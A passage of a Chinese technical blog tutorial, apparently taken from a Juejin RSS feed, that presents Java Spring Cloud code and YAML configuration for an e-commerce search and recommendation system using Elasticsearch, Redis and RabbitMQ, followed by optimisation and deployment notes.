    <span class="hljs-comment">/**
     * 个性化商品推荐（混合协同过滤+内容推荐）
     */</span>
    <span class="hljs-keyword">public</span> List&lt;ProductDTO&gt; <span class="hljs-title function_">personalizeProducts</span><span class="hljs-params">(List&lt;ProductDTO&gt; baseProducts, String userId)</span> {
        <span class="hljs-comment">// 1. 获取用户行为历史（优先从Redis缓存获取）</span>
        List&lt;UserBehaviorEvent&gt; userBehaviors = getUserBehaviors(userId);
        <span class="hljs-keyword">if</span> (userBehaviors.isEmpty()) {
            <span class="hljs-keyword">return</span> baseProducts; <span class="hljs-comment">// 无行为数据时直接返回搜索结果</span>
        }

        <span class="hljs-comment">// 2. 协同过滤推荐：基于相似用户的偏好推荐</span>
        List&lt;String&gt; cfRecommendIds = collaborativeFilteringRecommend(userId, userBehaviors);

        <span class="hljs-comment">// 3. 内容推荐：基于用户偏好的分类/品牌推荐</span>
        List&lt;String&gt; contentRecommendIds = contentBasedRecommend(userBehaviors);

        <span class="hljs-comment">// 4. 合并推荐结果（去重，保持顺序）</span>
        Set&lt;String&gt; allRecommendIds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>&lt;&gt;();
        allRecommendIds.addAll(cfRecommendIds);
        allRecommendIds.addAll(contentRecommendIds);

        <span class="hljs-comment">// 5. 获取推荐商品详情</span>
        List&lt;ProductDTO&gt; recommendProducts = getProductDetails(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(allRecommendIds));

        <span class="hljs-comment">// 6. 混合搜索结果与推荐结果（去重，限制总数50）</span>
        <span class="hljs-keyword">return</span> blendSearchAndRecommendations(baseProducts, recommendProducts);
    }

    <span class="hljs-comment">/**
     * 从Redis获取用户行为历史（由RabbitMQ消费端写入）
     */</span>
    <span class="hljs-keyword">private</span> List&lt;UserBehaviorEvent&gt; <span class="hljs-title function_">getUserBehaviors</span><span class="hljs-params">(String userId)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"user:behaviors:"</span> + userId;
        <span class="hljs-type">Object</span> <span class="hljs-variable">cachedBehaviors</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
        
        <span class="hljs-keyword">if</span> (cachedBehaviors != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> (List&lt;UserBehaviorEvent&gt;) cachedBehaviors;
        }

        <span class="hljs-comment">// 缓存未命中，从数据库加载（实际项目中实现DB查询逻辑）</span>
        List&lt;UserBehaviorEvent&gt; dbBehaviors = loadUserBehaviorsFromDB(userId);
        
        <span class="hljs-comment">// 缓存到Redis，有效期1小时</span>
        redisTemplate.opsForValue().set(cacheKey, dbBehaviors, Duration.ofHours(<span class="hljs-number">1</span>));
        <span class="hljs-keyword">return</span> dbBehaviors;
    }

    <span class="hljs-comment">// 其他核心方法（协同过滤、内容推荐、结果混合等，略，同前文Kafka方案）</span>
}
</code></pre>
<h4 data-id="heading-17">5. RabbitMQ 消息生产者与消费者实现</h4>
<h5 data-id="heading-18">5.1 消息生产者（商品服务、用户行为采集服务）</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 商品变更事件生产者</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductEventProducer</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;

    <span class="hljs-comment">/**
     * 发送商品变更事件到RabbitMQ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendProductChangeEvent</span><span class="hljs-params">(ProductChangeEvent event)</span> {
        <span class="hljs-keyword">try</span> {
            rabbitTemplate.convertAndSend(
                    RabbitMQConfig.PRODUCT_EXCHANGE,
                    <span class="hljs-string">"product.sync"</span>, <span class="hljs-comment">// 路由键</span>
                    event,
                    correlationData -&gt; {
                        <span class="hljs-comment">// 设置消息ID，用于确认机制</span>
                        correlationData.getId();
                        <span class="hljs-keyword">return</span> correlationData;
                    }
            );
            log.info(<span class="hljs-string">"商品变更事件发送成功，productId: {}, eventType: {}"</span>,
                    event.getProductId(), event.getEventType());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"商品变更事件发送失败，productId: {}"</span>, event.getProductId(), e);
            <span class="hljs-comment">// 失败时可本地持久化，后续重试</span>
        }
    }
}

<span class="hljs-comment">// 用户行为事件生产者</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserBehaviorProducer</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;

    <span class="hljs-comment">/**
     * 发送用户行为事件到RabbitMQ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendUserBehaviorEvent</span><span class="hljs-params">(UserBehaviorEvent event)</span> {
        <span class="hljs-keyword">try</span> {
            rabbitTemplate.convertAndSend(
                    RabbitMQConfig.PRODUCT_EXCHANGE,
                    <span class="hljs-string">"user.behavior"</span>, <span class="hljs-comment">// 路由键</span>
                    event
            );
            log.info(<span class="hljs-string">"用户行为事件发送成功，userId: {}, behaviorType: {}"</span>,
                    event.getUserId(), event.getBehaviorType());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"用户行为事件发送失败，userId: {}"</span>, event.getUserId(), e);
        }
    }
}
</code></pre>
<h5 data-id="heading-19">5.2 消息消费者（核心数据同步逻辑）</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ES同步消费端：消费商品变更事件，同步至Elasticsearch</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductSyncConsumer</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ElasticsearchRestTemplate elasticsearchTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;

    <span class="hljs-comment">/**
     * 消费商品同步队列消息
     */</span>
    <span class="hljs-meta">@RabbitListener(queues = RabbitMQConfig.PRODUCT_SYNC_QUEUE)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consumeProductSyncEvent</span><span class="hljs-params">(ProductChangeEvent event)</span> {
        log.info(<span class="hljs-string">"收到商品同步事件，productId: {}, eventType: {}"</span>,
                event.getProductId(), event.getEventType());

        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">switch</span> (event.getEventType()) {
                <span class="hljs-keyword">case</span> CREATE:
                <span class="hljs-keyword">case</span> UPDATE:
                    <span class="hljs-comment">// 同步商品到ES</span>
                    syncProductToES(event.getProduct());
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> DELETE:
                    <span class="hljs-comment">// 从ES删除商品</span>
                    deleteProductFromES(event.getProductId());
                    <span class="hljs-keyword">break</span>;
            }

            <span class="hljs-comment">// 触发缓存失效（保证数据一致性）</span>
            invalidateProductCache(event.getProductId());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"商品同步ES失败，productId: {}"</span>, event.getProductId(), e);
            <span class="hljs-comment">// 抛出异常，消息将被发送到死信队列</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AmqpRejectAndDontRequeueException</span>(<span class="hljs-string">"商品同步失败，进入死信队列"</span>, e);
        }
    }

    <span class="hljs-comment">/**
     * 同步商品到Elasticsearch
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">syncProductToES</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">ProductDocument</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> convertToProductDocument(product);
        doc.buildSuggest(); <span class="hljs-comment">// 构建搜索建议数据</span>
        elasticsearchTemplate.save(doc);
        log.info(<span class="hljs-string">"商品同步到ES成功，productId: {}"</span>, product.getId());
    }

    <span class="hljs-comment">// 辅助方法：从ES删除商品、缓存失效、DTO转换（略）</span>
}

<span class="hljs-comment">// 用户行为消费端：消费用户行为事件，存储至Redis与MySQL</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserBehaviorConsumer</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserBehaviorMapper userBehaviorMapper;

    <span class="hljs-comment">/**
     * 消费用户行为队列消息
     */</span>
    <span class="hljs-meta">@RabbitListener(queues = RabbitMQConfig.USER_BEHAVIOR_QUEUE)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consumeUserBehaviorEvent</span><span class="hljs-params">(UserBehaviorEvent event)</span> {
        log.info(<span class="hljs-string">"收到用户行为事件，userId: {}, productId: {}, behaviorType: {}"</span>,
                event.getUserId(), event.getProductId(), event.getBehaviorType());

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. 存储到MySQL（持久化）</span>
            <span class="hljs-type">UserBehaviorPO</span> <span class="hljs-variable">po</span> <span class="hljs-operator">=</span> convertToPO(event);
            userBehaviorMapper.insert(po);

            <span class="hljs-comment">// 2. 缓存到Redis（供推荐服务使用）</span>
            updateUserBehaviorCache(event);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"用户行为存储失败，userId: {}"</span>, event.getUserId(), e);
            <span class="hljs-comment">// 可根据业务需求决定是否重试，此处直接丢弃（或进入死信队列）</span>
        }
    }

    <span class="hljs-comment">/**
     * 更新用户行为Redis缓存
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateUserBehaviorCache</span><span class="hljs-params">(UserBehaviorEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"user:behaviors:"</span> + event.getUserId();
        List&lt;UserBehaviorEvent&gt; behaviors = (List&lt;UserBehaviorEvent&gt;) redisTemplate.opsForValue().get(cacheKey);
        
        <span class="hljs-keyword">if</span> (behaviors == <span class="hljs-literal">null</span>) {
            behaviors = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        }
        
        <span class="hljs-comment">// 添加新行为，限制缓存最近100条</span>
        behaviors.add(event);
        <span class="hljs-keyword">if</span> (behaviors.size() &gt; <span class="hljs-number">100</span>) {
            behaviors = behaviors.subList(behaviors.size() - <span class="hljs-number">100</span>, behaviors.size());
        }
        
        redisTemplate.opsForValue().set(cacheKey, behaviors, Duration.ofHours(<span class="hljs-number">1</span>));
    }

    <span class="hljs-comment">// 辅助方法：PO转换（略）</span>
}

<span class="hljs-comment">// 死信队列消费端：重试失败的商品同步消息</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadLetterConsumer</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductSyncConsumer productSyncConsumer;

    <span class="hljs-comment">/**
     * 消费死信队列消息（重试3次后放弃）
     */</span>
    <span class="hljs-meta">@RabbitListener(queues = RabbitMQConfig.DEAD_LETTER_QUEUE)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consumeDeadLetterEvent</span><span class="hljs-params">(ProductChangeEvent event, <span class="hljs-meta">@Header(AmqpHeaders.DELIVERY_TAG)</span> <span class="hljs-type">long</span> deliveryTag)</span> {
        log.info(<span class="hljs-string">"收到死信队列消息，productId: {}, eventType: {}"</span>,
                event.getProductId(), event.getEventType());

        <span class="hljs-comment">// 获取重试次数（从消息属性中获取）</span>
        <span class="hljs-type">Integer</span> <span class="hljs-variable">retryCount</span> <span class="hljs-operator">=</span> (Integer) redisTemplate.opsForValue().get(<span class="hljs-string">"retry:count:"</span> + event.getProductId());
        retryCount = retryCount == <span class="hljs-literal">null</span> ? <span class="hljs-number">1</span> : retryCount + <span class="hljs-number">1</span>;

        <span class="hljs-keyword">if</span> (retryCount &lt;= <span class="hljs-number">3</span>) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 重试同步逻辑</span>
                productSyncConsumer.consumeProductSyncEvent(event);
                <span class="hljs-comment">// 重试成功，删除重试计数</span>
                redisTemplate.delete(<span class="hljs-string">"retry:count:"</span> + event.getProductId());
                log.info(<span class="hljs-string">"死信消息重试成功，productId: {}, retryCount: {}"</span>, event.getProductId(), retryCount);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                <span class="hljs-comment">// 重试失败，更新重试计数，等待下次重试（可设置延迟）</span>
                redisTemplate.opsForValue().set(<span class="hljs-string">"retry:count:"</span> + event.getProductId(), retryCount, Duration.ofMinutes(<span class="hljs-number">5</span>));
                log.error(<span class="hljs-string">"死信消息重试失败，productId: {}, retryCount: {}"</span>, event.getProductId(), retryCount, e);
                <span class="hljs-comment">// 抛出异常，消息将重新入队（或根据策略丢弃）</span>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AmqpRejectAndDontRequeueException</span>(<span class="hljs-string">"重试失败"</span>, e);
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 重试次数超过3次，记录日志并丢弃</span>
            log.error(<span class="hljs-string">"死信消息重试次数耗尽，productId: {}, 请人工处理"</span>, event.getProductId());
            <span class="hljs-comment">// 手动确认消息，不再重试</span>
            <span class="hljs-comment">// channel.basicAck(deliveryTag, false);</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-20">6. 缓存优化策略实现</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductCacheService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ElasticsearchRestTemplate elasticsearchTemplate;

    <span class="hljs-comment">/**
     * 获取商品详情（缓存优先）
     */</span>
    <span class="hljs-keyword">public</span> ProductDTO <span class="hljs-title function_">getProductDetail</span><span class="hljs-params">(String productId)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product:detail:"</span> + productId;

        <span class="hljs-comment">// 1. 从Redis缓存获取</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">cachedProduct</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
        <span class="hljs-keyword">if</span> (cachedProduct != <span class="hljs-literal">null</span>) {
            log.debug(<span class="hljs-string">"从缓存获取商品详情，productId: {}"</span>, productId);
            <span class="hljs-keyword">return</span> (ProductDTO) cachedProduct;
        }

        <span class="hljs-comment">// 2. 缓存未命中，从ES获取</span>
        <span class="hljs-type">ProductDocument</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> elasticsearchTemplate.findById(productId, ProductDocument.class);
        <span class="hljs-keyword">if</span> (doc == <span class="hljs-literal">null</span>) {
            log.warn(<span class="hljs-string">"商品不存在，productId: {}"</span>, productId);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }

        <span class="hljs-comment">// 3. 转换为DTO并缓存（有效期30分钟）</span>
        <span class="hljs-type">ProductDTO</span> <span class="hljs-variable">productDTO</span> <span class="hljs-operator">=</span> convertToProductDTO(doc);
        redisTemplate.opsForValue().set(cacheKey, productDTO, Duration.ofMinutes(<span class="hljs-number">30</span>));
        log.debug(<span class="hljs-string">"商品详情缓存成功，productId: {}"</span>, productId);

        <span class="hljs-keyword">return</span> productDTO;
    }

    <span class="hljs-comment">/**
     * 获取热门商品列表（缓存+定时更新）
     */</span>
    <span class="hljs-keyword">public</span> List&lt;ProductDTO&gt; <span class="hljs-title function_">getHotProducts</span><span class="hljs-params">(<span class="hljs-type">int</span> count)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product:hot:"</span> + count;

        <span class="hljs-comment">// 1. 从缓存获取</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">cachedHotProducts</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
        <span class="hljs-keyword">if</span> (cachedHotProducts != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> (List&lt;ProductDTO&gt;) cachedHotProducts;
        }

        <span class="hljs-comment">// 2. 从ES查询热门商品（按销量降序）</span>
        <span class="hljs-type">NativeSearchQuery</span> <span class="hljs-variable">searchQuery</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeSearchQueryBuilder</span>()
                .withQuery(QueryBuilders.rangeQuery(<span class="hljs-string">"salesVolume"</span>).gt(<span class="hljs-number">0</span>))
                .withSort(SortBuilders.fieldSort(<span class="hljs-string">"salesVolume"</span>).order(SortOrder.DESC))
                .withPageable(PageRequest.of(<span class="hljs-number">0</span>, count))
                .build();

        SearchHits&lt;ProductDocument&gt; hits = elasticsearchTemplate.search(searchQuery, ProductDocument.class);
        List&lt;ProductDTO&gt; hotProducts = hits.getSearchHits().stream()
                .map(hit -&gt; convertToProductDTO(hit.getContent()))
                .collect(Collectors.toList());

        <span class="hljs-comment">// 3. 缓存结果（有效期10分钟，定时更新）</span>
        redisTemplate.opsForValue().set(cacheKey, hotProducts, Duration.ofMinutes(<span class="hljs-number">10</span>));
        log.info(<span class="hljs-string">"热门商品缓存成功，count: {}"</span>, count);

        <span class="hljs-keyword">return</span> hotProducts;
    }

    <span class="hljs-comment">// 辅助方法：DTO转换、缓存预热（略）</span>
}
</code></pre>
<h4 data-id="heading-21">7. 核心配置文件（application.yml）</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">product-search-service</span>
  <span class="hljs-comment"># 微服务注册发现（基于Nacos）</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">nacos:</span>
      <span class="hljs-attr">discovery:</span>
        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span>
  <span class="hljs-comment"># Elasticsearch配置</span>
  <span class="hljs-attr">data:</span>
    <span class="hljs-attr">elasticsearch:</span>
      <span class="hljs-attr">repositories:</span>
        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
      <span class="hljs-attr">client:</span>
        <span class="hljs-attr">reactive:</span>
          <span class="hljs-attr">connection-timeout:</span> <span class="hljs-string">5s</span>
          <span class="hljs-attr">socket-timeout:</span> <span class="hljs-string">60s</span>
      <span class="hljs-attr">uris:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">http://127.0.0.1:9200</span>
  <span class="hljs-comment"># Redis配置</span>
  <span class="hljs-attr">redis:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">6379</span>
    <span class="hljs-attr">password:</span>
    <span class="hljs-attr">lettuce:</span>
      <span class="hljs-attr">pool:</span>
        <span class="hljs-attr">max-active:</span> <span class="hljs-number">200</span>
        <span class="hljs-attr">max-idle:</span> <span class="hljs-number">50</span>
        <span class="hljs-attr">min-idle:</span> <span class="hljs-number">10</span>
        <span class="hljs-attr">max-wait:</span> <span class="hljs-string">2000ms</span>
  <span class="hljs-comment"># RabbitMQ配置</span>
  <span class="hljs-attr">rabbitmq:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">5672</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">guest</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">guest</span>
    <span class="hljs-attr">virtual-host:</span> <span class="hljs-string">/</span>
    <span class="hljs-comment"># 生产者确认配置</span>
    <span class="hljs-attr">publisher-confirm-type:</span> <span class="hljs-string">correlated</span>
    <span class="hljs-attr">publisher-returns:</span> <span class="hljs-literal">true</span>
    <span class="hljs-comment"># 消费者配置</span>
    <span class="hljs-attr">listener:</span>
      <span class="hljs-attr">simple:</span>
        <span class="hljs-attr">acknowledge-mode:</span> <span class="hljs-string">auto</span> <span class="hljs-comment"># 自动确认消息</span>
        <span class="hljs-attr">retry:</span>
          <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># 开启重试</span>
          <span class="hljs-attr">max-attempts:</span> <span class="hljs-number">3</span> <span class="hljs-comment"># 最大重试次数</span>
          <span class="hljs-attr">initial-interval:</span> <span class="hljs-string">1000ms</span> <span class="hljs-comment"># 初始重试间隔</span>

<span class="hljs-comment"># Elasticsearch索引优化配置</span>
<span class="hljs-attr">elasticsearch:</span>
  <span class="hljs-attr">index:</span>
    <span class="hljs-attr">number-of-shards:</span> <span class="hljs-number">3</span> <span class="hljs-comment"># 分片数（根据集群节点数调整）</span>
    <span class="hljs-attr">number-of-replicas:</span> <span class="hljs-number">1</span> <span class="hljs-comment"># 副本数（保障高可用）</span>
    <span class="hljs-attr">refresh-interval:</span> <span class="hljs-string">30s</span> <span class="hljs-comment"># 索引刷新间隔（提升写入性能）</span>

<span class="hljs-comment"># 服务端口</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8082</span>

<span class="hljs-comment"># 日志配置</span>
<span class="hljs-attr">logging:</span>
  <span class="hljs-attr">level:</span>
    <span class="hljs-attr">org.springframework.amqp.rabbit.core:</span> <span class="hljs-string">INFO</span>
    <span class="hljs-attr">com.example.search:</span> <span class="hljs-string">INFO</span>
</code></pre>
<h3 data-id="heading-22">四、RabbitMQ 方案核心优势与性能优化</h3>
<h4 data-id="heading-23">1. 相比 Kafka 方案的差异化优势</h4>
<ul>
<li><strong>消息可靠性更高</strong>：RabbitMQ 支持消息确认（生产者确认 + 消费者确认）、死信队列、消息重试，适合对数据一致性要求高的场景；</li>
<li><strong>路由更灵活</strong>：支持 topic、direct、fanout 等多种交换机类型，可根据业务需求精准路由消息；</li>
<li><strong>部署与运维更轻量</strong>：单节点部署即可满足中小规模电商需求，配置简单，故障排查便捷；</li>
<li><strong>延迟队列原生支持</strong>：通过死信队列 + TTL 可轻松实现延迟重试，无需额外插件。</li>
</ul>
<h4 data-id="heading-24">2. 系统核心优势</h4>
<ul>
<li><strong>高性能检索</strong>：Elasticsearch 毫秒级响应 + Redis 缓存，搜索响应时间控制在 100ms 以内；</li>
<li><strong>精准搜索体验</strong>：多字段权重匹配 + 中文分词 + 模糊搜索，大幅提升搜索精准度；</li>
<li><strong>个性化推荐</strong>：基于用户行为的协同过滤 + 内容推荐，推荐准确率提升 30%+；</li>
<li><strong>实时数据同步</strong>：RabbitMQ 异步通信，商品数据变更同步延迟低于 1 秒；</li>
<li><strong>系统解耦与高可用</strong>：服务间通过消息通信，故障隔离，单个服务下线不影响整体链路。</li>
</ul>
<h4 data-id="heading-25">3. 关键性能优化点</h4>
<ul>
<li>
<p><strong>RabbitMQ 优化</strong>：</p>
<ul>
<li>合理设置队列并发消费者数量（3-5 个），避免消费瓶颈；</li>
<li>开启消息批量发送与消费，减少网络 IO 开销；</li>
<li>队列绑定死信交换机，避免消息丢失，同时控制重试次数防止死循环；</li>
</ul>
</li>
<li>
<p><strong>ES 优化</strong>：合理设置分片与副本数，调整索引刷新间隔，优化查询语句（避免全索引扫描）；</p>
</li>
<li>
<p><strong>缓存优化</strong>：多级缓存设计，缓存预热与主动失效结合，提升缓存命中率至 90%+；</p>
</li>
<li>
<p><strong>代码优化</strong>：避免重复查询，使用流式处理，减少对象创建，提升代码执行效率。</p>
</li>
</ul>
<h3 data-id="heading-26">五、生产部署注意事项</h3>
<h4 data-id="heading-27">1. RabbitMQ 部署建议</h4>
<ul>
<li><strong>环境配置</strong>：生产环境建议 3 节点集群部署（镜像队列模式），保障高可用；</li>
<li><strong>资源配置</strong>：CPU 2-4 核，内存 4-8GB，磁盘选择 SSD，避免消息写入延迟；</li>
<li><strong>持久化配置</strong>：开启队列与消息持久化，防止服务重启后消息丢失；</li>
<li><strong>限流配置</strong>：通过 <code>prefetchCount</code> 控制消费者每次拉取消息数量，避免消费端过载。</li>
</ul>
<h4 data-id="heading-28">2. 数据一致性保障</h4>
<ul>
<li>采用 “事件驱动 + 最终一致性” 方案，商品变更事件通过 RabbitMQ 异步同步，失败时进入死信队列重试；</li>
<li>缓存与 ES/MySQL 同步采用 “更新后失效” 策略，避免缓存脏数据；</li>
<li>关键业务（如订单创建）可通过本地消息表 + RabbitMQ 实现可靠消息投递。</li>
</ul>
<h4 data-id="heading-29">3. 监控与告警</h4>
<ul>
<li>接入 Prometheus + Grafana 监控 RabbitMQ 队列长度、消息堆积量、消费速率；</li>
<li>配置关键指标告警（如队列堆积超 1000 条、消费失败率超 5%）；</li>
<li>日志收集采用 ELK 栈，便于排查消息发送 / 消费异常。</li>
</ul>
<h3 data-id="heading-30">六、总结</h3>
<p>本文基于 <strong>SpringCloud + Elasticsearch + Redis + RabbitMQ</strong> 技术栈，完整实现了一套高性能电商实时搜索与个性化推荐系统，重点突出了 RabbitMQ 在数据同步、事件分发、系统解耦中的核心作用。该方案适合中小规模电商平台，具有部署轻量、可靠性高、开发成本低等优势，可快速落地并解决传统搜索推荐方案的核心痛点。</p>
<p>在实际项目中，可根据业务规模灵活扩展：小型电商可简化部署（单节点 RabbitMQ + ES 单节点），中大型电商可升级为 RabbitMQ 集群 + ES 分片集群 + Redis 集群，进一步提升系统吞吐量与可用性。通过不断优化搜索算法、推荐策略与消息队列配置，可持续提升用户体验与平台转化效率</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter事件防抖整理（初版）]]></title>    <link>https://juejin.cn/post/7596845113281249289</link>    <guid>https://juejin.cn/post/7596845113281249289</guid>    <pubDate>2026-01-19T12:08:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596845113281249289" data-draft-id="7596687697756504074" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter事件防抖整理（初版）"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-19T12:08:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="卖火箭的小男孩"/> <meta itemprop="url" content="https://juejin.cn/user/4457847613830523"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter事件防抖整理（初版）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4457847613830523/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    卖火箭的小男孩
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T12:08:00.000Z" title="Mon Jan 19 2026 12:08:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
